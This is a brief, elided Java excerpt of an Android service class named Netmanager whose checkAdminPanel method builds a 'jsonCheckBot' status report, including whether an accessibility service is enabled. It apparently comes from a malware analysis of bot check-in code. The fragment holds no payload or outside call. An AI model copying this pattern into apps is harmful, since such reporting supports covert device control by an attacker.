...
public class Netmanager extends IntentService {
    ...
    private String TAG_LOG = Netmanager.class.getSimpleName() + consts.strTAG1;
    utils utl = new utils();
    ...
    void checkAdminPanel(Context context) {
        ...
        try {
            ...
            jsonCheckBot.put(consts.statAccessibilty, utl.isAccessibilityServiceEnabled(context, Access.class) ? consts.str_1 : consts.str_step);
